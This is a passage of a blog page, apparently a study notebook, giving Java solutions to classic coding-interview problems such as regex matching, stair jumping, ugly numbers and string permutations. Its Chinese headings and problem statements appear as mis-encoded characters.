class="number">52</span>;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(map[i]!=-<span class="number">2</span>&amp;&amp;map[i]!=-<span class="number">1</span>)&#123;</span><br><span class="line">               res=Math.min(res,map[i]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res==Integer.MAX_VALUE?-<span class="number">1</span>:res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="æŠŠå­—ç¬¦ä¸²è½¬åŒ–æˆæ•´æ•°">æŠŠå­—ç¬¦ä¸²è½¬åŒ–æˆæ•´æ•° âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">StrToInt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (str == <span class="literal">null</span> || str.length() == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isNegative</span> <span class="operator">=</span> str.charAt(<span class="number">0</span>) == <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">    <span class="type">long</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> str.charAt(i);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span> &amp;&amp; (c == <span class="string">&#x27;+&#x27;</span> || c == <span class="string">&#x27;-&#x27;</span>))  <span class="comment">/* ç¬¦å·åˆ¤å®š */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (c &lt; <span class="string">&#x27;0&#x27;</span> || c &gt; <span class="string">&#x27;9&#x27;</span>)                <span class="comment">/* éæ³•è¾“å…¥ */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        ret = ret * <span class="number">10</span> + (c - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = isNegative? -ret:ret;</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;=Integer.MAX_VALUE&amp;&amp;ret&gt;=Integer.MIN_VALUE) <span class="keyword">return</span> (<span class="type">int</span>)ret;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°-">æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•° -</span></h2><p>è¾“å…¥ä¸€ä¸ªæ­£æ•´æ•°æ•°ç»„ï¼ŒæŠŠæ•°ç»„é‡Œæ‰€æœ‰æ•°å­—æ‹¼æ¥èµ·æ¥æ’æˆä¸€ä¸ªæ•°ï¼Œæ‰“å°èƒ½æ‹¼æ¥å‡ºçš„æ‰€æœ‰æ•°å­—ä¸­æœ€å°çš„ä¸€ä¸ªã€‚ä¾‹å¦‚è¾“å…¥æ•°ç»„{3ï¼Œ32ï¼Œ321}ï¼Œåˆ™æ‰“å°å‡ºè¿™ä¸‰ä¸ªæ•°å­—èƒ½æ’æˆçš„æœ€å°æ•°å­—ä¸º321323ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">PrintMinNumber</span><span class="params">(<span class="type">int</span> [] numbers)</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (numbers == <span class="literal">null</span> || numbers.length == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> numbers.length;</span><br><span class="line">            String[] nums = <span class="keyword">new</span> <span class="title class_">String</span>[n];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                nums[i] = numbers[i] + <span class="string">&quot;&quot;</span>;</span><br><span class="line">            Arrays.sort(nums, (s1, s2) -&gt; (s1 + s2).compareTo(s2 + s1));</span><br><span class="line">            <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (String str : nums)</span><br><span class="line">                ret += str;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1><span id="åŠ¨æ€è§„åˆ’">åŠ¨æ€è§„åˆ’</span></h1><h2><span id="æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…-">æ­£åˆ™è¡¨è¾¾å¼åŒ¹é… -</span></h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥åŒ¹é…åŒ…æ‹¬â€™.â€™å’Œâ€™<em>â€˜çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚æ¨¡å¼ä¸­çš„å­—ç¬¦â€™.â€™è¡¨ç¤ºä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œâ€™</em>â€˜è¡¨ç¤ºå®ƒå‰é¢çš„å­—ç¬¦å¯ä»¥å‡ºç°ä»»æ„æ¬¡ï¼ˆåŒ…å«0æ¬¡ï¼‰ã€‚ åœ¨æœ¬é¢˜ä¸­ï¼ŒåŒ¹é…æ˜¯æŒ‡å­—ç¬¦ä¸²çš„æ‰€æœ‰å­—ç¬¦åŒ¹é…æ•´ä¸ªæ¨¡å¼ã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²â€aaaâ€ä¸æ¨¡å¼â€a.aâ€å’Œâ€ab<em>ac</em>aâ€åŒ¹é…ï¼Œä½†æ˜¯ä¸â€aa.aâ€å’Œâ€ab*aâ€å‡ä¸åŒ¹é…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">match</span><span class="params">(<span class="type">char</span>[] str, <span class="type">char</span>[] pattern)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> m=str.length,n=pattern.length;</span><br><span class="line">        <span class="type">boolean</span>[][] dp=<span class="keyword">new</span> <span class="title class_">boolean</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pattern[i-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>&amp;&amp;dp[<span class="number">0</span>][i-<span class="number">2</span>])dp[<span class="number">0</span>][i]=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(pattern[j-<span class="number">1</span>]==<span class="string">&#x27;.&#x27;</span>||pattern[j-<span class="number">1</span>]==str[i-<span class="number">1</span>])</span><br><span class="line">                    dp[i][j]=dp[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(pattern[j-<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(pattern[j-<span class="number">2</span>]==str[i-<span class="number">1</span>]||pattern[j-<span class="number">2</span>]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        dp[i][j]|=dp[i][j-<span class="number">2</span>]|dp[i][j-<span class="number">1</span>]|dp[i-<span class="number">1</span>][j];</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        dp[i][j]|=dp[i][j-<span class="number">2</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="è·³å°é˜¶">è·³å°é˜¶ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">JumpFloor</span><span class="params">(<span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;=target;i++)&#123;</span><br><span class="line">        dp[i%<span class="number">4</span>]=dp[(i-<span class="number">1</span>)%<span class="number">4</span>]+dp[(i-<span class="number">2</span>)%<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[target%<span class="number">4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="å˜æ€è·³å°é˜¶">å˜æ€è·³å°é˜¶ âˆš</span></h2><p>ä¸€åªé’è›™ä¸€æ¬¡å¯ä»¥è·³ä¸Š1çº§å°é˜¶ï¼Œä¹Ÿå¯ä»¥è·³ä¸Š2çº§â€¦â€¦å®ƒä¹Ÿå¯ä»¥è·³ä¸Šnçº§ã€‚æ±‚è¯¥é’è›™è·³ä¸Šä¸€ä¸ªnçº§çš„å°é˜¶æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">JumpFloorII</span><span class="params">(<span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> dp[]=<span class="keyword">new</span> <span class="title class_">int</span>[target+<span class="number">1</span>];</span><br><span class="line">        Arrays.fill(dp,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=target;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;j++)</span><br><span class="line">                dp[i]+=dp[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="å‰ªç»³å­">å‰ªç»³å­ âˆš</span></h2><p>ç»™ä½ ä¸€æ ¹é•¿åº¦ä¸ºnçš„ç»³å­ï¼Œè¯·æŠŠç»³å­å‰ªæˆæ•´æ•°é•¿çš„mæ®µï¼ˆmã€néƒ½æ˜¯æ•´æ•°ï¼Œn&gt;1å¹¶ä¸”m&gt;1ï¼‰ï¼Œæ¯æ®µç»³å­çš„é•¿åº¦è®°ä¸ºk[0],k[1],â€¦,k[m]ã€‚è¯·é—®k[0]xk[1]xâ€¦xk[m]å¯èƒ½çš„æœ€å¤§ä¹˜ç§¯æ˜¯å¤šå°‘ï¼Ÿä¾‹å¦‚ï¼Œå½“ç»³å­çš„é•¿åº¦æ˜¯8æ—¶ï¼Œæˆ‘ä»¬æŠŠå®ƒå‰ªæˆé•¿åº¦åˆ†åˆ«ä¸º2ã€3ã€3çš„ä¸‰æ®µï¼Œæ­¤æ—¶å¾—åˆ°çš„æœ€å¤§ä¹˜ç§¯æ˜¯18ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">integerBreak</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">            dp[i] = Math.max(dp[i], Math.max(j * (i - j), dp[j] * (i - j)));</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="æ–æ³¢é‚£å¥‘">æ–æ³¢é‚£å¥‘ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">    dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= N ; i++)&#123;</span><br><span class="line">        dp[i%<span class="number">3</span>] = dp[(i-<span class="number">1</span>)%<span class="number">3</span>] + dp[(i-<span class="number">2</span>)%<span class="number">3</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N%<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="çŸ©å½¢è¦†ç›–">çŸ©å½¢è¦†ç›– âˆš</span></h2><p>æˆ‘ä»¬å¯ä»¥ç”¨2<em>1çš„å°çŸ©å½¢æ¨ªç€æˆ–è€…ç«–ç€å»è¦†ç›–æ›´å¤§çš„çŸ©å½¢ã€‚è¯·é—®ç”¨nä¸ª2</em>1çš„å°çŸ©å½¢æ— é‡å åœ°è¦†ç›–ä¸€ä¸ª2*nçš„å¤§çŸ©å½¢ï¼Œæ€»å…±æœ‰å¤šå°‘ç§æ–¹æ³•ï¼Ÿ</p><p>æ¯”å¦‚n&#x3D;3æ—¶ï¼Œ2*3çš„çŸ©å½¢å—æœ‰3ç§è¦†ç›–æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">RectCover</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">      <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line">      dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">      dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">          dp[i%<span class="number">4</span>]=dp[(i-<span class="number">1</span>)%<span class="number">4</span>]+dp[(i-<span class="number">2</span>)%<span class="number">4</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> dp[n%<span class="number">4</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="è¿ç»­æ•°ç»„çš„æœ€å¤§å’Œ">è¿ç»­æ•°ç»„çš„æœ€å¤§å’Œ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">FindGreatestSumOfSubArray</span><span class="params">(<span class="type">int</span>[] array)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(array==<span class="literal">null</span>||array.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">       <span class="type">int</span> res=array[<span class="number">0</span>];</span><br><span class="line">       <span class="type">int</span> dp[]=<span class="keyword">new</span> <span class="title class_">int</span>[array.length];</span><br><span class="line">        dp[<span class="number">0</span>]=res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;array.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i-<span class="number">1</span>]+array[i]&gt;array[i])</span><br><span class="line">                dp[i]=dp[i-<span class="number">1</span>]+array[i];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i]=array[i];</span><br><span class="line">            res=Math.max(dp[i],res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="ä¸‘æ•°">ä¸‘æ•° Ã—</span></h2><p>æŠŠåªåŒ…å«è´¨å› å­2ã€3å’Œ5çš„æ•°ç§°ä½œä¸‘æ•°ï¼ˆUgly Numberï¼‰ã€‚ä¾‹å¦‚6ã€8éƒ½æ˜¯ä¸‘æ•°ï¼Œä½†14ä¸æ˜¯ï¼Œå› ä¸ºå®ƒåŒ…å«è´¨å› å­7ã€‚ ä¹ æƒ¯ä¸Šæˆ‘ä»¬æŠŠ1å½“åšæ˜¯ç¬¬ä¸€ä¸ªä¸‘æ•°ã€‚æ±‚æŒ‰ä»å°åˆ°å¤§çš„é¡ºåºçš„ç¬¬Nä¸ªä¸‘æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">GetUglyNumber_Solution</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (N &lt;= <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>, i3 = <span class="number">0</span>, i5 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[N];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">next2</span> <span class="operator">=</span> dp[i2] * <span class="number">2</span>, next3 = dp[i3] * <span class="number">3</span>, next5 = dp[i5] * <span class="number">5</span>;</span><br><span class="line">        dp[i] = Math.min(next2, Math.min(next3, next5));</span><br><span class="line">        <span class="keyword">if</span> (dp[i] == next2)</span><br><span class="line">            i2++;</span><br><span class="line">        <span class="keyword">if</span> (dp[i] == next3)</span><br><span class="line">            i3++;</span><br><span class="line">        <span class="keyword">if</span> (dp[i] == next5)</span><br><span class="line">            i5++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="å­—ç¬¦ä¸²çš„æ’åˆ—-">å­—ç¬¦ä¸²çš„æ’åˆ— -</span></h2><p>è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²,æŒ‰å­—å…¸åºæ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²ä¸­å­—ç¬¦çš„æ‰€æœ‰æ’åˆ—ã€‚ä¾‹å¦‚è¾“å…¥å­—ç¬¦ä¸²abc,åˆ™æ‰“å°å‡ºç”±å­—ç¬¦a,b,cæ‰€èƒ½æ’åˆ—å‡ºæ¥çš„æ‰€æœ‰å­—ç¬¦ä¸²abc,acb,bac,bca,cabå’Œcbaã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;String&gt; <span class="title function_">Permutation</span><span class="params">(String str)</span> &#123;</span><br><span class="line">       ArrayList&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">if</span>(str==<span class="literal">null</span>||str.length()==<span class="number">0</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">return</span> back(str,res,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(),<span class="keyword">new</span> <span class="title class_">boolean</span>[str.length()]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;String&gt; <span class="title function_">back</span><span class="params">(String str,ArrayList&lt;String&gt; res,StringBuilder sb,<span class="type">boolean</span>[] memo)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sb.length()==str.length())&#123;</span><br><span class="line">            res.add(sb.toString());</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;str.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>&amp;&amp;!memo[i-<span class="number">1</span>]&amp;&amp;str.charAt(i)==str.charAt(i-<span class="number">1</span>)) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(memo[i]==<span class="literal">false</span>)&#123;</span><br><span class="line">                memo[i]=<span class="literal">true</span>;</span><br><span class="line">                sb.append(str.charAt(i));</span><br><span class="line">                back(str,res,sb,memo);</span><br><span class="line">                sb.deleteCharAt(sb.length()-<span class="number">1</span>);</span><br><span class="line">                memo[i]=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è®°ä½deleteCharAt</p><h1><span id="æ ˆå’Œé˜Ÿåˆ—">æ ˆå’Œé˜Ÿåˆ—</span></h1><h2><span id="å­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªä¸é‡å¤çš„å­—ç¬¦">å­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªä¸é‡å¤çš„å­—ç¬¦ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//Insert one char from stringstream</span></span><br><span class="line">    Map&lt;Character,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    Queue&lt;Character&gt; q = <span class="keyword">new</span> <span class="title class_">LinkedList</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Insert</span><span class="params">(<span class="type">char</span> ch)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(map.containsKey(ch)) map.put(ch,<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            map.put(ch,<span class="number">1</span>);</span><br><span class="line">            q.offer(ch);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//return the first appearence once char in current stringstream</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">FirstAppearingOnce</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">            <span class="type">char</span> c=q.peek();</span><br><span class="line">            <span class="keyword">if</span>(map.get(c)==<span class="number">1</span>)<span class="keyword">return</span> c;</span><br><span class="line">            <span class="keyword">else</span> q.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨">ä»å°¾åˆ°å¤´æ‰“å°é“¾è¡¨ âˆš</span></h2><p>è¾“å…¥ä¸€ä¸ªé“¾è¡¨ï¼ŒæŒ‰é“¾è¡¨ä»å°¾åˆ°å¤´çš„é¡ºåºè¿”å›ä¸€ä¸ªArrayListã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;Integer&gt; <span class="title function_">printListFromTailToHead</span><span class="params">(ListNode listNode)</span> &#123;</span><br><span class="line">    Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (listNode != <span class="literal">null</span>) &#123;</span><br><span class="line">        stack.add(listNode.val);</span><br><span class="line">        listNode = listNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">    ArrayList&lt;Integer&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty())</span><br><span class="line">        ret.add(stack.pop());</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="åŒ…å«minå‡½æ•°çš„æ ˆ">åŒ…å«minå‡½æ•°çš„æ ˆ âˆš</span></h2><p>å®šä¹‰æ 